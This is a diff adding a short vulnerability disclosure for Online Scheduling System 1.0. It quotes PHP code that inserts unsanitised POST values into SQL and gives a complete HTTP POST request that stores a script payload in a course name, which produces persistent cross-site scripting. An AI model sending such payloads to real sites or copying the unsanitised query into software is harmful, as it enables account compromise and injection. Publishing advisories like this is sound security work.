@@ -1,0 +1,26 @@
+# Exploit Title: Online Scheduling System 1.0 - Persistent Cross-Site Scripting
+# Exploit Author: Bobby Cooke
+# Date: 2020-04-30
+# Vendor Homepage: https://www.sourcecodester.com/php/14168/online-scheduling-system.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/razormist/online-scheduling-system.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
+# Vulnerability Info:
+#   Online Scheduling System v1.0 suffers from an authenticated persistent cross-site scripting vulnerability. This Proof of Concept (PoC) will cause all users of the system,  with read access to the courses, to execute arbitrary client-side code when viewing the 'Home' and 'List' tabs within the web application. The application fails to sanitize arguments supplied by the user before inserting them into the SQL database.
+
+# Vulnerable Source Code
+## /add.cor.php
+ 14  $Course_Code = $_POST['corcode'];
+ 15  $Course_name = $_POST['corname'];
+ 16 
+ 17  $sql = "INSERT INTO course (Course_Code, Course_name) VALUES ('$Course_Code', '$Course_name')";
+
+# Malicious POST Request
+  POST /Online%20Scheduling%20System/add.cor.php HTTP/1.1
+  Host: 172.16.65.130
+  Referer: http://172.16.65.130/Online%20Scheduling%20System/addcourse.php
+  Content-Type: application/x-www-form-urlencoded
+  Connection: close
+  Cookie: PHPSESSID=8o12pka3gvais768f43v5q4d60
+
+  corcode=XSS-101&corname=%3Cscript%3Ealert%28%22XSS-101%22%29%3B%3C%2Fscript%3E&submit=
